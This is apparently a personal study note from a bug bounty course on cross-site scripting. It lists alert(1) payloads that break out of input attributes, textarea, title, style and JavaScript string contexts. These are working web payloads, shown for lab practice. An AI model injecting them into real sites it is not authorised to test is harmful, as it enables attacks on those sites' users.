# XSS (HackingHub)

## Basic XSS

```html
<script>alert("1")</script>
```

![Pasted image 20241120124025.png](../../assets/images/7e761abc2c296e9248ae.png)

## Escaping Context

### Input

```html
<input value="test">
```

```html
"><script>alert(1)</script>
```

![Pasted image 20241120125055.png](../../assets/images/53181543f70e98801586.png)

```html
" onmouseover=alert(1);//
```

![Pasted image 20241120125551.png](../../assets/images/b10684d67f0defc376ef.png)

### Textarea

```html
<textarea>test</textarea>
```

```html
</textarea><script>alert(1)</script>
```

![Pasted image 20241120131231.png](../../assets/images/8b6ad8218c14a2f92a09.png)

### Title

```html
<title>Welcome, test</title>
```

```html
</title><script>alert(1)</script>
```

### Style

```html
<style>
        body {
            background-color: test;
        }
    </style>
```

```html
</style><script>alert(1)</script>
```

### Javascript variables

```html
<script>
var name = 'test'; $('span#name').html( name );
</script>
```

```html
test';alert(1)//
```

![Pasted image 20241120133508.png](../../assets/images/cce560c255708f432ff5.png)

## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | BB/hackinghub/Client side/XSS/XSS.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

[Índice de categoría](../README.md) · [Inicio](../../README.md)
